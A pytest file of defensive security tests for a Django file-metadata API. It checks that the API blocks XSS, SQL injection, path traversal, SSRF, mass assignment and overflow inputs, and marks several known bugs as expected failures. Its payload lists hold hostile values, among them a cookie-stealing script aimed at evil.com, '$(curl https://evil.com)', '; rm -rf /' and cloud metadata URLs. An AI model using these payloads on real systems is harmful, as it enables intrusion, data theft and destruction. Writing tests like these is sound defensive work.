"""
T294: File Metadata Red Team Security Tests.

Paranoid security tests for file metadata vulnerabilities.
OWASP API Top 10 2023: API3:2023 BOPLA, API8:2023 Security Misconfiguration
"""

import json
import pytest
from datetime import timedelta
from decimal import Decimal
from model_bakery import baker
from rest_framework.test import APIClient
from django.conf import settings

from api.core.models import User, Role
from api.storage.models import File, Library


# XSS payloads for stored XSS test
XSS_PAYLOADS = [
    ("<script>alert(1)</script>", "basic_script"),
    ('<img src=x onerror="alert(1)">', "img_onerror"),
    ("javascript:alert(1)", "javascript_proto"),
    ('<svg onload="alert(1)">', "svg_onload"),
    ('<iframe src="javascript:alert(1)">', "iframe_js"),
    ('<body onload="alert(1)">', "body_onload"),
    ('"><script>alert(1)</script>', "quote_breakout"),
    ("'-'\"><script>alert(1)</script>", "complex_breakout"),
    ("<scr ipt>alert(1)</scr ipt>", "space_evasion"),
    ('<script>fetch("https://evil.com?c="+document.cookie)</script>', "data_exfil"),
]

# SQLi payloads for text fields
SQLI_PAYLOADS = [
    ("'; DROP TABLE files; --", "drop_table"),
    ("' UNION SELECT * FROM users --", "union_select"),
    ("1' OR '1'='1", "or_true"),
    ("1' AND 1=1 --", "and_true"),
    ("'; INSERT INTO users VALUES ('hacker', 'pass') --", "insert_inject"),
    ("%' OR name LIKE '%", "like_wildcard"),
    ("\\' OR \\\"1\\\"=\\\"1", "escaped_quotes"),
]

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd", "unix_traversal"),
    ("..\\..\\..\\windows\\system32\\config\\sam", "windows_traversal"),
    ("....//....//....//etc/passwd", "double_dot_slash"),
    ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded"),
    ("/etc/passwd%00.jpg", "null_byte_evasion"),
    ("../../../../../../etc/hosts", "deep_traversal"),
]

# Command injection payloads
CMD_INJECTION_PAYLOADS = [
    ("; cat /etc/passwd", "semicolon_cmd"),
    ("| whoami", "pipe_cmd"),
    ("`id`", "backtick_cmd"),
    ("$(curl https://evil.com)", "command_sub"),
    ("; rm -rf /", "destructive_cmd"),
]

# SSRF payloads
SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
    ("http://localhost:22", "localhost_ssh"),
    ("http://127.0.0.1:8080/admin", "localhost_admin"),
    ("file:///etc/passwd", "file_proto"),
    ("gopher://localhost:9000/", "gopher_proto"),
]

# Unicode attacks
UNICODE_ATTACKS = [
    ("日本語タイトル", "japanese"),
    ("العربية", "arabic"),
    ("🎵🎶🎸🔥", "emoji"),
    ("<script>alert(1)</script>", "mixed_xss_unicode"),
    ("\u0000\u0001\u0002", "null_control"),
    ("\uffff\ufffe", "non_chars"),
    ("ṭ͔̟͕̱̩̣̭̥̬̦̭̮̯̰̱̲̳̹̺̻̼̇", "overlong_utf8"),
]

# Data type confusion
TYPE_CONFUSION = [
    ("null", "null_string"),
    ("undefined", "undefined_string"),
    ("true", "true_string"),
    ("false", "false_string"),
    ("[]", "empty_array"),
    ("{}", "empty_object"),
    ("0", "zero_string"),
    ("", "empty_string"),
]


@pytest.mark.django_db
class TestMetadataMassAssignment:
    """API3:2023 - Broken Object Property Level Authorization via metadata."""

    @pytest.mark.parametrize("field,value", [
        ("id", 999999),
        pytest.param("filepath", "/etc/passwd", marks=pytest.mark.xfail(reason="T884: filepath mass assignment", strict=True)),
        ("md5", "a" * 32),
        ("directory", "/root"),
    ])
    def test_mass_assignment_readonly_fields_blocked(self, field, value, api_client, faker):
        """Read-only fields should not be modifiable via PATCH."""
        user = baker.make(User, username=f"mass_ro_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="MASS", name="Mass", description="Test")
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )
        original_id = file_obj.id
        original_filepath = file_obj.filepath

        # Try to modify read-only field
        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )
        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({field: value}),
            content_type="application/json",
        )

        file_obj.refresh_from_db()

        # Verify field was not changed
        if field == "id":
            assert file_obj.id == original_id, f"ID was changed via mass assignment!"
        elif field == "filepath":
            assert file_obj.filepath == original_filepath, f"filepath was changed!"

    @pytest.mark.xfail(reason="BOPLA: Owner can be changed via metadata - T882", strict=True)
    def test_mass_assignment_owner_field(self, api_client, faker):
        """Owner field should not be modifiable via metadata PATCH. (T882)"""
        user_a = baker.make(User, username=f"own_a_{faker.user_name()}", role=Role.HOST)
        user_b = baker.make(User, username=f"own_b_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="OWNER", name="Owner", description="Test")
        
        file_obj = baker.make(
            File,
            name="ownership_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user_a,
        )

        # Try to change owner
        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )
        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"owner": user_b.id}),
            content_type="application/json",
        )

        file_obj.refresh_from_db()

        # Owner should not have changed
        assert file_obj.owner_id == user_a.id, f"Owner changed to {file_obj.owner_id}"

    @pytest.mark.xfail(reason="T885: created_at mass assignment", strict=True)
    def test_mass_assignment_created_at_blocked(self, api_client, faker):
        """created_at should be read-only. (T885)"""
        user = baker.make(User, username=f"created_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="CREATED", name="Created", description="Test")
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )
        original_created = file_obj.created_at

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )
        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"created_at": "2020-01-01T00:00:00Z"}),
            content_type="application/json",
        )

        file_obj.refresh_from_db()
        assert file_obj.created_at == original_created, "created_at was modified!"


@pytest.mark.django_db
class TestMetadataXSSInjection:
    """Stored XSS via metadata fields."""

    @pytest.mark.parametrize("payload,test_name", [
        pytest.param("<script>alert(1)</script>", "basic_script", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
        ("<img src=x onerror=\"alert(1)\">", "img_onerror"),
        ("javascript:alert(1)", "javascript_proto"),
        ('<svg onload="alert(1)">', "svg_onload"),
        ('<iframe src="javascript:alert(1)">', "iframe_js"),
        ('<body onload="alert(1)">', "body_onload"),
        pytest.param('\"><script>alert(1)</script>', "quote_breakout", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
        pytest.param("'-'\"><script>alert(1)</script>", "complex_breakout", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
        ("<scr ipt>alert(1)</scr ipt>", "space_evasion"),
        pytest.param('<script>fetch("https://evil.com?c="+document.cookie)</script>', "data_exfil", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
    ])
    def test_xss_in_track_title_blocked(self, payload, test_name, api_client, faker):
        """XSS payloads in track_title should be sanitized or rejected."""
        user = baker.make(User, username=f"xss_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="XSS", name="XSS", description="Test")
        file_obj = baker.make(
            File,
            name="xss_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )
        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"track_title": payload}),
            content_type="application/json",
        )

        # Should either reject or sanitize
        if response.status_code == 200:
            # If accepted, should be sanitized (no raw script tags)
            data = response.json()
            stored_value = data.get("track_title", "")
            assert "<script>" not in stored_value or "<script>" not in payload.lower(), \
                f"Raw script tag stored: {test_name}"

    @pytest.mark.parametrize("payload,test_name", [
        pytest.param("<script>alert(1)</script>", "basic_script", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
        ("<img src=x onerror=\"alert(1)\">", "img_onerror"),
        ("javascript:alert(1)", "javascript_proto"),
        ('<svg onload="alert(1)">', "svg_onload"),
        ('<iframe src="javascript:alert(1)">', "iframe_js"),
        ('<body onload="alert(1)">', "body_onload"),
        pytest.param('\"><script>alert(1)</script>', "quote_breakout", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
        pytest.param("'-'\"><script>alert(1)</script>", "complex_breakout", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
        ("<scr ipt>alert(1)</scr ipt>", "space_evasion"),
        pytest.param('<script>fetch("https://evil.com?c="+document.cookie)</script>', "data_exfil", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
    ])
    def test_xss_in_artist_name_blocked(self, payload, test_name, api_client, faker):
        """XSS payloads in artist_name should be sanitized."""
        user = baker.make(User, username=f"xss_art_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="XSSART", name="XSS", description="Test")
        file_obj = baker.make(
            File,
            name="xss_artist.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )
        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"artist_name": payload}),
            content_type="application/json",
        )

        # Should not store raw XSS
        if response.status_code == 200:
            data = response.json()
            stored = data.get("artist_name", "")
            if "<script>" in payload.lower():
                assert "<script>" not in stored, f"XSS stored in artist_name: {test_name}"

    @pytest.mark.parametrize("payload,test_name", [
        pytest.param("<script>alert(1)</script>", "basic_script", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
        ("<img src=x onerror=\"alert(1)\">", "img_onerror"),
        ("javascript:alert(1)", "javascript_proto"),
        ('<svg onload="alert(1)">', "svg_onload"),
        ('<iframe src="javascript:alert(1)">', "iframe_js"),
        ('<body onload="alert(1)">', "body_onload"),
        pytest.param('\"><script>alert(1)</script>', "quote_breakout", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
        pytest.param("'-'\"><script>alert(1)</script>", "complex_breakout", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
        ("<scr ipt>alert(1)</scr ipt>", "space_evasion"),
        pytest.param('<script>fetch("https://evil.com?c="+document.cookie)</script>', "data_exfil", marks=pytest.mark.xfail(reason="T883: Stored XSS", strict=True)),
    ])
    def test_xss_in_album_title_blocked(self, payload, test_name, api_client, faker):
        """XSS payloads in album_title should be sanitized."""
        user = baker.make(User, username=f"xss_alb_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="XSSALB", name="XSS", description="Test")
        file_obj = baker.make(
            File,
            name="xss_album.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )
        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"album_title": payload}),
            content_type="application/json",
        )

        if response.status_code == 200:
            data = response.json()
            stored = data.get("album_title", "")
            if "<script>" in payload.lower():
                assert "<script>" not in stored, f"XSS stored in album_title: {test_name}"


@pytest.mark.django_db
class TestMetadataSQLInjection:
    """SQL injection via metadata fields."""

    @pytest.mark.parametrize("payload,test_name", SQLI_PAYLOADS)
    def test_sqli_in_text_fields_no_crash(self, payload, test_name, api_client, faker):
        """SQLi in metadata fields should not cause 500 error."""
        user = baker.make(User, username=f"sqli_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="SQLI", name="SQLI", description="Test")
        file_obj = baker.make(
            File,
            name="sqli_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )
        
        # Try SQLi in various text fields
        text_fields = ["track_title", "artist_name", "album_title", "genre", "mood"]
        
        for field in text_fields:
            response = client.patch(
                f"/api/v2/files/{file_obj.id}",
                json.dumps({field: payload}),
                content_type="application/json",
            )
            
            # Should not crash with 500
            assert response.status_code != 500, \
                f"SQLi caused 500 in {field}: {test_name}"

    def test_sqli_in_filter_params(self, api_client, faker):
        """SQLi via filter/search parameters."""
        user = baker.make(User, username=f"sqli_f_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="SQLIF", name="SQLIF", description="Test")
        baker.make(
            File,
            name="filter_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        sqli_filters = [
            "track_title=' OR '1'='1",
            "artist_name=1 UNION SELECT * FROM users",
            "genre='; DROP TABLE files; --",
        ]

        for filter_param in sqli_filters:
            response = api_client.get(f"/api/v2/files?{filter_param}")
            # Should not crash
            assert response.status_code in [200, 400], \
                f"SQLi filter caused error: {filter_param[:50]}"


@pytest.mark.django_db
class TestMetadataPathTraversal:
    """Path traversal via filepath and related fields."""

    @pytest.mark.parametrize("payload,test_name", [
        pytest.param("../../../etc/passwd", "unix_traversal", marks=pytest.mark.xfail(reason="T886: Path traversal", strict=True)),
        ("..\\..\\..\\windows\\system32\\config\\sam", "windows_traversal"),
        pytest.param("....//....//....//etc/passwd", "double_dot_slash", marks=pytest.mark.xfail(reason="T886: Path traversal", strict=True)),
        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded"),
        pytest.param("/etc/passwd%00.jpg", "null_byte_evasion", marks=pytest.mark.xfail(reason="T886: Path traversal", strict=True)),
        ("../../../../../../etc/hosts", "deep_traversal"),
    ])
    def test_path_traversal_in_filepath_blocked(self, payload, test_name, api_client, faker):
        """Path traversal in filepath should be blocked."""
        user = baker.make(User, username=f"path_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="PATH", name="Path", description="Test")
        file_obj = baker.make(
            File,
            name="path_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
            filepath="/valid/path/file.mp3",
        )
        original_path = file_obj.filepath

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )
        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"filepath": payload}),
            content_type="application/json",
        )

        file_obj.refresh_from_db()

        # Path should not be changed to traversal
        if "passwd" in payload or ".." in payload:
            assert file_obj.filepath == original_path or "/etc/passwd" not in file_obj.filepath, \
                f"Path traversal accepted: {test_name}"

    @pytest.mark.xfail(reason="T886: Path traversal in directory", strict=True)
    def test_directory_traversal_in_metadata(self, api_client, faker):
        """Directory field path traversal. (T886)"""
        user = baker.make(User, username=f"dir_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="DIR", name="Dir", description="Test")
        file_obj = baker.make(
            File,
            name="dir_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
            directory="/valid/dir/",
        )

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )
        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"directory": "../../../etc"}),
            content_type="application/json",
        )

        # Should reject or sanitize
        if response.status_code == 200:
            file_obj.refresh_from_db()
            assert "../../../" not in file_obj.directory, "Directory traversal accepted"


@pytest.mark.django_db
class TestMetadataDataExfiltration:
    """Data exfiltration via metadata fields."""

    def test_metadata_length_limits(self, api_client, faker):
        """Very long metadata should be rejected or truncated."""
        user = baker.make(User, username=f"len_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="LEN", name="Len", description="Test")
        file_obj = baker.make(
            File,
            name="len_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        # Try very long strings
        long_strings = [
            ("A" * 10000, "10k_chars"),
            ("B" * 100000, "100k_chars"),
            ("C" * 1000000, "1M_chars"),
        ]

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )

        for long_str, test_name in long_strings:
            response = client.patch(
                f"/api/v2/files/{file_obj.id}",
                json.dumps({"track_title": long_str}),
                content_type="application/json",
            )

            # Should not crash, might truncate or reject
            assert response.status_code in [200, 400, 413], \
                f"Long string caused error: {test_name}"

    def test_binary_data_in_metadata(self, api_client, faker):
        """Binary data in metadata fields."""
        user = baker.make(User, username=f"bin_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="BIN", name="Bin", description="Test")
        file_obj = baker.make(
            File,
            name="bin_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        binary_strings = [
            b"\x00\x01\x02\x03".decode('latin-1', errors='ignore'),
            b"\xff\xfe".decode('latin-1', errors='ignore'),
            "\x00",  # Null byte
        ]

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )

        for bin_str in binary_strings:
            try:
                response = client.patch(
                    f"/api/v2/files/{file_obj.id}",
                    json.dumps({"track_title": bin_str}),
                    content_type="application/json",
                )
                assert response.status_code in [200, 400], "Binary data caused error"
            except Exception as e:
                # Should handle gracefully
                pass


@pytest.mark.django_db
class TestMetadataSSRF:
    """SSRF via metadata URL fields."""

    @pytest.mark.parametrize("payload,test_name", SSRF_PAYLOADS)
    def test_ssrf_in_url_fields_blocked(self, payload, test_name, api_client, faker):
        """SSRF payloads in URL-like metadata fields."""
        user = baker.make(User, username=f"ssrf_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="SSRF", name="SSRF", description="Test")
        file_obj = baker.make(
            File,
            name="ssrf_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        # Try in fields that might be URLs
        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )

        # Test in comment field (if URL-like)
        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"track_title": payload}),
            content_type="application/json",
        )

        # Should not cause internal requests (no way to test directly here)
        # But should not crash
        assert response.status_code in [200, 400]


@pytest.mark.django_db
class TestMetadataUnicodeAttacks:
    """Unicode normalization and homograph attacks."""

    @pytest.mark.parametrize("payload,test_name", UNICODE_ATTACKS)
    def test_unicode_in_metadata_accepted(self, payload, test_name, api_client, faker):
        """Unicode should be handled properly in metadata."""
        user = baker.make(User, username=f"uni_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="UNI", name="Uni", description="Test")
        file_obj = baker.make(
            File,
            name="uni_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )
        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"track_title": payload}),
            content_type="application/json",
        )

        # Should handle unicode gracefully (accept or reject, not crash)
        assert response.status_code in [200, 400], \
            f"Unicode caused error: {test_name}"

    def test_unicode_normalization_security(self, api_client, faker):
        """Unicode normalization could bypass filters."""
        # Different unicode representations of similar characters
        homographs = [
            ("а", "cyrillic_a"),  # Cyrillic 'а' looks like latin 'a'
            ("е", "cyrillic_e"),  # Cyrillic 'е' looks like latin 'e'
            ("о", "cyrillic_o"),  # Cyrillic 'о' looks like latin 'o'
        ]

        user = baker.make(User, username=f"norm_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="NORM", name="Norm", description="Test")
        file_obj = baker.make(
            File,
            name="norm_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )

        for char, name in homographs:
            response = client.patch(
                f"/api/v2/files/{file_obj.id}",
                json.dumps({"artist_name": f"Test{char}Artist"}),
                content_type="application/json",
            )
            assert response.status_code in [200, 400]


@pytest.mark.django_db
class TestMetadataNumericOverflow:
    """Numeric overflow and type confusion attacks."""

    def test_integer_overflow_in_numeric_fields(self, api_client, faker):
        """Integer overflow in numeric metadata fields."""
        user = baker.make(User, username=f"overflow_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="OVERFLOW", name="Overflow", description="Test")
        file_obj = baker.make(
            File,
            name="overflow_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        overflow_values = [
            2147483647,  # Max int32
            2147483648,  # Max int32 + 1
            9223372036854775807,  # Max int64
            -9223372036854775808,  # Min int64
        ]

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )

        for value in overflow_values:
            response = client.patch(
                f"/api/v2/files/{file_obj.id}",
                json.dumps({
                    "bit_rate": value,
                    "sample_rate": value,
                    "bpm": value,
                }),
                content_type="application/json",
            )
            # Should handle gracefully
            assert response.status_code in [200, 400], f"Overflow caused error: {value}"

    def test_float_precision_issues(self, api_client, faker):
        """Float precision edge cases."""
        user = baker.make(User, username=f"float_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="FLOAT", name="Float", description="Test")
        file_obj = baker.make(
            File,
            name="float_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        weird_floats = [
            float('inf'),
            float('-inf'),
            float('nan'),
            1e308,  # Very large
            1e-308,  # Very small
        ]

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )

        for value in weird_floats:
            try:
                response = client.patch(
                    f"/api/v2/files/{file_obj.id}",
                    json.dumps({"replay_gain": value}),
                    content_type="application/json",
                )
                assert response.status_code in [200, 400]
            except Exception:
                # Should handle gracefully
                pass


@pytest.mark.django_db
class TestMetadataSensitiveDataExposure:
    """Sensitive data exposure via metadata."""

    def test_no_internal_paths_in_response(self, api_client, faker):
        """Internal file paths should not be exposed."""
        user = baker.make(User, username=f"path_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="PATH", name="Path", description="Test")
        file_obj = baker.make(
            File,
            name="path_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
            filepath="/internal/storage/path/secret/file.mp3",
        )

        response = api_client.get(f"/api/v2/files/{file_obj.id}")
        assert response.status_code == 200
        
        data = response.json()
        
        # Should not expose full internal paths
        if "filepath" in data:
            filepath = data["filepath"]
            assert "/etc/" not in filepath, "System path exposed"
            assert "/root/" not in filepath, "Root path exposed"

    def test_no_md5_of_sensitive_files(self, api_client, faker):
        """MD5 hashes could be used for malicious purposes."""
        user = baker.make(User, username=f"md5_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="MD5", name="MD5", description="Test")
        file_obj = baker.make(
            File,
            name="md5_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
            md5="d41d8cd98f00b204e9800998ecf8427e",  # Empty file MD5
        )

        response = api_client.get(f"/api/v2/files/{file_obj.id}")
        assert response.status_code == 200
        
        # MD5 is generally OK to expose, but verify it's handled correctly
        data = response.json()
        # Just verify response is valid JSON


@pytest.mark.django_db
class TestMetadataContentTypeAttacks:
    """Content-Type confusion attacks."""

    def test_wrong_content_type_rejected(self, api_client, faker):
        """PATCH with wrong Content-Type should be rejected."""
        user = baker.make(User, username=f"ct_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="CT", name="CT", description="Test")
        file_obj = baker.make(
            File,
            name="ct_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )
        
        # Try form-urlencoded instead of JSON
        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            "track_title=Test&artist_name=Artist",
            content_type="application/x-www-form-urlencoded",
        )

        # Should reject or handle gracefully
        assert response.status_code in [200, 400, 415]

    def test_json_merge_patch_handled(self, api_client, faker):
        """JSON Merge Patch should be handled correctly."""
        user = baker.make(User, username=f"merge_{faker.user_name()}", role=Role.HOST)
        library = baker.make(Library, code="MERGE", name="Merge", description="Test")
        file_obj = baker.make(
            File,
            name="merge_test.mp3",
            mime="audio/mp3",
            library=library,
            owner=user,
        )

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}",
        )
        
        response = client.patch(
            f"/api/v2/files/{file_obj.id}",
            json.dumps({"track_title": "Merged"}),
            content_type="application/merge-patch+json",
        )

        # Should handle gracefully
        assert response.status_code in [200, 400, 415]
